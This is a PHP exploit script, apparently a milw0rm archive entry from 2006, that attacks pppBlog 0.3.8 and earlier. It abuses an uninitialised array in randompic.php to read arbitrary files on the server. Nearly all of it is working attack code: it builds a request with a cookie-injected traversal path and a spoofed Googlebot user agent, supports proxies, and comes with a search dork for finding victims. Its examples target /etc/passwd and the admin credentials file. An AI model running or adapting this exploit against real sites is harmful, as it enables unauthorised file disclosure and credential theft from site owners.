#!/usr/bin/php -q -d short_open_tag=on
<?
echo "pppBlog <= 0.3.8 system disclosure exploit\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";
echo "dork: intext:\"Powered by pppblog\"\r\n\r\n";
/*
works with:
register_globals=On
*/

if ($argc<4) {
echo "Usage: php ".$argv[0]." host path path_to_file OPTIONS\r\n";
echo "host:         target server (ip/hostname)\r\n";
echo "path:         path to pppblog\r\n";
echo "path_to_file: a file which you want to see content of\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /pppblog/ ../../../../../../etc/passwd\r\n";
echo "php ".$argv[0]." localhost /pppblog/ ../config/admin.php -p81\r\n";
echo "php ".$argv[0]." localhost / ../config/admin.php -P1.1.1.1:80\r\n\r\n";
die;
}
/* software site: http://joerg.jo.funpic.org/pppblog/static.php?page=welcome

vulnerable code in randompic.php at lines 66-68:
...
header("Content-Type: image/gif");
header("Content-Transfer-Encoding: binary");
readfile("$dir/$files[$randnum]");
...

if randompic.php is called directly, without arguments, $files array is
not initialized, so , if register_globals = On, you can see all
files on target server, according to open_basedir restrictions, poc:

http://[target]/[path]/randompic.php?files[0]=../config/admin.php

now at screen you have ppp-blog admin username/password pair, crypted by
crypt() php function
									      */

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$path_to_file=$argv[3];
if (($path[0]<>'/') | ($path[strlen($path)-1]<>'/'))
{die("Check the path, it must begin and end with a trailing slash\r\n");}
$port=80;
$proxy="";
for ($i=4; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy<>'') {$p="http://".$host.":".$port.$path;} else {$p=$path;}

$packet ="GET ".$p."randompic.php HTTP/1.0\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: files[0]=".urlencode($path_to_file)."\r\n"; //through cookies, log this :)
$packet.="Connection: Close\r\n\r\n";
#debug
#echo quick_dump($packet);
sendpacketii($packet);
echo $html;
?>

# milw0rm.com [2006-05-31]
